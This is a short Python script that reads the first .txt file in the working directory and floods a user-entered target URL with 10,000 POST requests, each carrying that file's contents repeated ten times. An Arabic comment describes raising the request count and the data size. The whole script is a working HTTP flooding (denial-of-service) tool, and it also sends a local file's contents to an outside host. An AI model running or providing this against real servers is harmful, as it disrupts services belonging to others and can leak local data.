from urllib import request
import os

def find_data_file():
    for file in os.listdir():
        if file.endswith(".txt"):
            return file
    return None

def read_data_file(file_path):
    with open(file_path, "r") as file:
        data = file.read()
    return data

def send_http_request(target_url, num_requests=1000, data=''):
    for _ in range(num_requests):
        req = request.Request(target_url, data=data.encode(), method='POST')
        with request.urlopen(req) as res:
            print("Request sent:", res.status)

target_url = input("Enter the target URL: ")

data_file_path = find_data_file()

if data_file_path:
    print(f"Data file found: {data_file_path}")
    data = read_data_file(data_file_path)
    send_http_request(target_url, num_requests=10000, data=data*10)  # تكرار البيانات 10 مرات وزيادة عدد الطلبات
else:
    print("No data file found!")
